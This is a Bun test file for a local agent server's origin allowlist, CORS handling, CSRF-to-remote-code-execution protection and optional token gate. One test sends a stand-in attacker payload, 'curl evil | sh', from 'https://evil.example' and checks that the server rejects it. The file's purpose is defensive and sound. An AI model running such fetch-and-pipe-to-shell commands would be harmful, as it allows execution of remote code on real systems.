import { describe, expect, test } from 'bun:test';
import { ProcessManager } from '../agent/manager';
import {
  corsHeaders,
  createFetchHandler,
  isOriginAllowed,
  resolveAllowedOrigins,
} from '../agent/server';

const ALLOWED = ['http://localhost:5273'];

function put(
  url: string,
  body: unknown,
  origin: string | null,
  headers: Record<string, string> = {}
) {
  return new Request(url, {
    method: 'PUT',
    headers: {
      'Content-Type': 'application/json',
      ...(origin ? { Origin: origin } : {}),
      ...headers,
    },
    body: JSON.stringify(body),
  });
}

describe('agent origin policy', () => {
  test('isOriginAllowed: allowlist + no-origin, rejects others (trailing slash tolerant)', () => {
    expect(isOriginAllowed('http://localhost:5273', ALLOWED)).toBe(true);
    expect(isOriginAllowed('http://localhost:5273/', ALLOWED)).toBe(true);
    expect(isOriginAllowed(null, ALLOWED)).toBe(true); // curl / same process
    expect(isOriginAllowed('https://evil.example', ALLOWED)).toBe(false);
  });

  test('resolveAllowedOrigins merges dev defaults with env, deduped', () => {
    const out = resolveAllowedOrigins({
      AGENT_ALLOWED_ORIGINS: 'https://dash.example/, http://localhost:5273',
    } as NodeJS.ProcessEnv);
    expect(out).toContain('http://localhost:5273');
    expect(out).toContain('http://127.0.0.1:5273');
    expect(out).toContain('https://dash.example');
    expect(out.filter((o) => o === 'http://localhost:5273')).toHaveLength(1);
  });

  test('CORS never returns a wildcard and only reflects allowed origins', () => {
    expect(corsHeaders('http://localhost:5273', ALLOWED)['Access-Control-Allow-Origin']).toBe(
      'http://localhost:5273'
    );
    // disallowed / absent origin → no ACAO at all (browser blocks), never `*`
    expect(
      corsHeaders('https://evil.example', ALLOWED)['Access-Control-Allow-Origin']
    ).toBeUndefined();
    expect(corsHeaders(null, ALLOWED)['Access-Control-Allow-Origin']).toBeUndefined();
    for (const o of [null, 'https://evil.example', 'http://localhost:5273']) {
      expect(corsHeaders(o, ALLOWED)['Access-Control-Allow-Origin']).not.toBe('*');
    }
  });
});

describe('agent CSRF-to-RCE protection', () => {
  test('cross-origin config PUT is rejected 403 and never mutates the launch command', async () => {
    const m = new ProcessManager();
    const before = m.getConfig().command;
    const handle = createFetchHandler(m, { allowedOrigins: ALLOWED });

    const res = await handle(
      put(
        'http://127.0.0.1:6800/control/config',
        { command: 'curl evil | sh' },
        'https://evil.example'
      )
    );

    expect(res.status).toBe(403);
    expect(res.headers.get('Access-Control-Allow-Origin')).toBeNull();
    // The RCE vector: the attacker-supplied command must NOT have been merged.
    expect(m.getConfig().command).toBe(before);
    expect(m.getConfig().command).not.toContain('evil');
  });

  test('same-origin (dashboard) config PUT succeeds and reflects the origin', async () => {
    const m = new ProcessManager();
    const handle = createFetchHandler(m, { allowedOrigins: ALLOWED });
    const res = await handle(
      put('http://127.0.0.1:6800/control/config', { httpPort: 7777 }, 'http://localhost:5273')
    );
    expect(res.status).toBe(200);
    expect(res.headers.get('Access-Control-Allow-Origin')).toBe('http://localhost:5273');
    expect(m.getConfig().httpPort).toBe(7777);
  });

  test('non-browser caller (no Origin) still works for local use', async () => {
    const m = new ProcessManager();
    const handle = createFetchHandler(m, { allowedOrigins: ALLOWED });
    const res = await handle(put('http://127.0.0.1:6800/control/config', { httpPort: 8123 }, null));
    expect(res.status).toBe(200);
    expect(m.getConfig().httpPort).toBe(8123);
  });

  test('OPTIONS preflight: ACAO for allowed origin, none for disallowed', async () => {
    const m = new ProcessManager();
    const handle = createFetchHandler(m, { allowedOrigins: ALLOWED });
    const ok = await handle(
      new Request('http://127.0.0.1:6800/control/config', {
        method: 'OPTIONS',
        headers: { Origin: 'http://localhost:5273' },
      })
    );
    expect(ok.status).toBe(204);
    expect(ok.headers.get('Access-Control-Allow-Origin')).toBe('http://localhost:5273');

    const bad = await handle(
      new Request('http://127.0.0.1:6800/control/config', {
        method: 'OPTIONS',
        headers: { Origin: 'https://evil.example' },
      })
    );
    expect(bad.headers.get('Access-Control-Allow-Origin')).toBeNull();
  });
});

describe('agent optional token gate', () => {
  test('when AGENT_TOKEN is set, mutating requests require it; reads do not', async () => {
    const m = new ProcessManager();
    const handle = createFetchHandler(m, { allowedOrigins: ALLOWED, token: 's3cr3t' });

    // no token → 401
    const denied = await handle(
      put('http://127.0.0.1:6800/control/config', { httpPort: 9000 }, 'http://localhost:5273')
    );
    expect(denied.status).toBe(401);
    expect(m.getConfig().httpPort).not.toBe(9000);

    // bearer token → ok
    const okBearer = await handle(
      put('http://127.0.0.1:6800/control/config', { httpPort: 9000 }, 'http://localhost:5273', {
        Authorization: 'Bearer s3cr3t',
      })
    );
    expect(okBearer.status).toBe(200);
    expect(m.getConfig().httpPort).toBe(9000);

    // x-agent-token header → ok
    const okHeader = await handle(
      put('http://127.0.0.1:6800/control/config', { httpPort: 9001 }, 'http://localhost:5273', {
        'X-Agent-Token': 's3cr3t',
      })
    );
    expect(okHeader.status).toBe(200);

    // reads unaffected by the token gate
    const read = await handle(
      new Request('http://127.0.0.1:6800/control/config', {
        headers: { Origin: 'http://localhost:5273' },
      })
    );
    expect(read.status).toBe(200);
  });
});
